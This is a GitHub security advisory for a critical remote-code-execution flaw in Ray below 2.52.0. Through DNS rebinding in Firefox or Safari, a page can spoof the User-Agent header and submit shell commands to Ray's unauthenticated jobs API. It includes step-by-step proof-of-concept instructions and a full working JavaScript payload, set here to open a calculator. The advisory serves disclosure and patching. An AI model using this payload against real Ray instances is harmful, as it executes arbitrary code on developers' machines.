# [C] Ray is vulnerable to Critical RCE via Safari & Firefox Browsers through DNS Rebinding Attack

## Summary
Severity: Critical
Advisory: GHSA-q279-jhrf-cc6v
CVE: CVE-2025-62593
CWE: CWE-352, CWE-94
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2025-11-26
Source: https://github.com/advisories/GHSA-q279-jhrf-cc6v
Type: github-advisory

## Affected
- PyPI: `ray` — affected >=0 <2.52.0

## Details
# Summary

Developers working with Ray as a development tool can be exploited via a critical RCE vulnerability exploitable via Firefox and Safari. 

Due to the longstanding [decision](https://docs.ray.io/en/releases-2.51.1/ray-security/index.html) by the Ray Development team to not implement any sort of authentication on critical endpoints, like the `/api/jobs` & `/api/job_agent/jobs/` has once again led to a severe vulnerability that allows attackers to execute arbitrary code against Ray. This time in a development context via the browsers Firefox and Safari.

This vulnerability is due to an insufficient guard against browser-based attacks, as the current defense uses the `User-Agent` header starting with the string "Mozilla" as a defense mechanism. This defense is insufficient as the fetch specification allows the `User-Agent` header to be modified.

Combined with a DNS rebinding attack against the browser, and this vulnerability is exploitable against a developer running Ray who inadvertently visits a malicious website, or is served a malicious advertisement ([malvertising](https://en.wikipedia.org/wiki/Malvertising)).

# Details

The mitigations implemented to protect against browser based attacks against local Ray nodes are insufficient.

## Current Mitigation Strategies

```python
def is_browser_request(req: Request) -> bool:
    """Checks if a request is made by a browser like user agent.

    This heuristic is very weak, but hard for a browser to bypass- eg,
    fetch/xhr and friends cannot alter the user-agent, but requests made with
    an http library can stumble into this if they choose to user a browser like
    user agent.
    """
    return req.headers["User-Agent"].startswith("Mozilla")


def deny_browser_requests() -> Callable:
    """Reject any requests that appear to be made by a browser"""

    def decorator_factory(f: Callable) -> Callable:
        @functools.wraps(f)
        async def decorator(self, req: Request):
            if is_browser_request(req):
                return Response(
                    text="Browser requests not allowed",
                    status=aiohttp.web.HTTPMethodNotAllowed.status_code,
                )
            return await f(self, req)

        return decorator

    return decorator_factory
```

https://github.com/ray-project/ray/blob/f39a860436dca3ed5b9dfae84bd867ac10c84dc6/python/ray/dashboard/optional_utils.py#L129-L155

```python
    @aiohttp.web.middleware
    async def browsers_no_post_put_middleware(self, request, handler):
        if (
            # A best effort test for browser traffic. All common browsers
            # start with Mozilla at the time of writing.
            dashboard_optional_utils.is_browser_request(request)
            and request.method in [hdrs.METH_POST, hdrs.METH_PUT]
        ):
            return aiohttp.web.Response(
                status=405, text="Method Not Allowed for browser traffic."
            )

        return await handler(request)
```
https://github.com/ray-project/ray/blob/e7889ae542bf0188610bc8b06d274cbf53790cbd/python/ray/dashboard/http_server_head.py#L184-L196

This is because the fundamental assumption that the `User-Agent` header can't be manipulated is incorrect. In Firefox and in Safari, the `fetch` API allows the `User-Agent` header to be set to a different value. Chrome is not vulnerable, ironically, because of a [bug](https://issues.chromium.org/issues/40450316), bringing it out of spec with the `fetch` specification.

Exploiting this vulnerability requires a DNS rebinding attack against the browser. Something trivially done by modern tooling like [nccgroup/singularity](https://github.com/nccgroup/singularity).

# PoC

Please note, this full PoC will be going live at time of disclosure.

 1. Launch Ray `ray start --head --port=6379`
 2. Ensure that the ray dashboard/service is running on port `8265`
 3. Launch an internet facing version of NCCGroup/Singularity following the [setup guide here](https://github.com/nccgroup/singularity/wiki/Setup-and-Installation).
 4. Visit the in Firefox or Safari: http://[my.singularity.instance]:8265/manager.html
 5. Under "Attack Payload" select: `Ray Jobs RCE (default port 8265)`
 6. Click "Start Attack". If you see a 404 error in the iFrame window that pops up, refresh the page and retry starting at step 3.
 7. Once the DNS rebinding attack succeeds (you may need to try a few times), an alert will appear, then the jobs API will be invoked, and the embedded shell code will be executed, popping up the calculator.

If this attack doesn't work, consider clicking the "Toggle Advanced Options" and trying an alternative "Rebinding Strategy". I've personally been able to get this attack to work multiple times on MacOS on multiple different residential networks around the Seattle area. Some corporate networks _may_ block DNS rebinding attacks, but likely not many.

## What's going on?

This is the payload running in [nccgroup/singularity](https://github.com/nccgroup/singularity):

```javascript
/**
 * This payload exploits Ray (https://github.com/ray-project/ray)
 * It opens the "Calculator" application on various operating systems.
 * The payload can be easily modified to target different OSes or implementations.
 * The TCP port attacked is 8265.
 */

const RayRce = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        // Get the current timestamp in milliseconds
        const timestamp = Date.now();
        
        // OS-agnostic calculator command that tries multiple approaches
        const calculatorCommand = `
            # Try Windows calculator first
            if command -v calc.exe >/dev/null 2>&1; then
                echo Windows calculator launching
                calc.exe &
            # Try macOS calculator
            elif command -v open >/dev/null 2>&1; then
                echo macOS calculator launching
                open -a Calculator &
            elif [ -f "/System/Applications/Calculator.app/Contents/MacOS/Calculator" ]; then
                echo macOS calculator launching
                /System/Applications/Calculator.app/Contents/MacOS/Calculator &
            # Try Linux calculators
            elif command -v gnome-calculator >/dev/null 2>&1; then
                echo Linux calculator launching
                gnome-calculator &
            elif command -v kcalc >/dev/null 2>&1; then
                echo Linux calculator launching
                kcalc &
            elif command -v xcalc >/dev/null 2>&1; then
                echo Linux calculator launching
                xcalc &
            # Fallback: try to find any calculator binary
            else
                echo Linux calculator launching
                find /usr/bin /usr/local/bin /opt -name "*calc*" -type f -executable 2>/dev/null | head -1 | xargs -I {} {} &
            fi
            echo RAY RCE: By JLLeitschuh ${timestamp}
        `;
        
        const data = {
            "entrypoint": calculatorCommand,
            "runtime_env": {},
            "job_id": null,
            "metadata": {
                "job_submission_id": timestamp.toString(),
                "source": "nccgroup/singluarity"
            }
        };
        
        sooFetch('/api/jobs/', {
            method: 'POST',
            headers: {
                'User-Agent': 'Other',
            },
            body: JSON.stringify(data),
        })
        .then(response => {
            console.log(response);
            return response.json()
        }) // parses JSON response into native JavaScript objects
        .then(data => {
            console.log('Success:', data);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    }
    
    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        return sooFetch("/",{
            mode: 'no-cors',
            credentials: 'omit',
        })
        .then(function (response) {
            return response.text()
        })
        .then(function (d) {
            if (d.includes("You need to enable JavaScript")) {
                return true;
            } else {
                return false;
            }
        })
        .catch(e => { return (false); })
    }

    return {
        attack,
        isService
    }
}

Registry["Ray Jobs RCE"] = RayRce();
```

See: https://github.com/nccgroup/singularity/pull/68
 
# Impact
 
This vulnerability impacts developers running development/testing environments with Ray. If they fall victim to a phishing attack, or are served a malicious ad, they can be exploited and arbitrary shell code can be executed on their developer machine.

This attack can also be leveraged to attack network-adjacent instance of ray by leveraging the browser as a confused deputy intermediary to attack ray instances running inside a private corporate network.

# Fix

The fix for this vulnerability is to update to Ray 2.52.0 or higher. This version also, finally, adds a disabled-by-default authentication feature that can further harden against this vulnerability: https://docs.ray.io/en/latest/ray-security/token-auth.html

Fix commit: https://github.com/ray-project/ray/commit/70e7c72780bdec075dba6cad1afe0832772bfe09

Several browsers have, after knowing about the attack for 19 years, recently begun hardening against DNS rebinding. ([Chrome Local Network Access](https://developer.chrome.com/blog/local-network-access)). These changes _may_ protect you, but a previous initiative, "private network access" was rolled back. So updating is highly recommended as a defense-in-depth strategy.

# Credit

The fetch bypass was originally theorized by @avilum at [Oligo](https://www.oligo.security/). The DNS rebinding step, full POC, and disclosure was by @JLLeitschuh while at [Socket](https://socket.dev/).

## References
- https://github.com/ray-project/ray/security/advisories/GHSA-q279-jhrf-cc6v
- https://nvd.nist.gov/vuln/detail/CVE-2025-62593
- https://github.com/nccgroup/singularity/pull/68
- https://github.com/ray-project/ray/commit/70e7c72780bdec075dba6cad1afe0832772bfe09
- https://docs.ray.io/en/releases-2.51.1/ray-security/index.html
- https://en.wikipedia.org/wiki/Malvertising
- https://github.com/ray-project/ray
- https://github.com/ray-project/ray/blob/e7889ae542bf0188610bc8b06d274cbf53790cbd/python/ray/dashboard/http_server_head.py#L184-L196
- https://github.com/ray-project/ray/blob/f39a860436dca3ed5b9dfae84bd867ac10c84dc6/python/ray/dashboard/optional_utils.py#L129-L155
